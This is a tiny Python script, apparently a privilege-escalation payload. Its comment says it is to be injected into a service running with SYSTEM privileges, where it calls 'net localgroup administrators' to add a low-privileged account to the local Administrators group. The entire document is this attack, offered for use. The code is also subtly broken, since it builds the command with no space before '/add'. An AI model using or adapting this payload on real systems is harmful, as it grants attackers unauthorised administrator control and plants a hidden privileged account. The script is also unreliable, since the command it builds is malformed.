#This script add a user to local admins group it needs to be injected into a service running System privs
import os

#user to be added to local admins.  This user must exist on system.
user = "lowpriv"

os.system("net localgroup administrators " + user + "/add")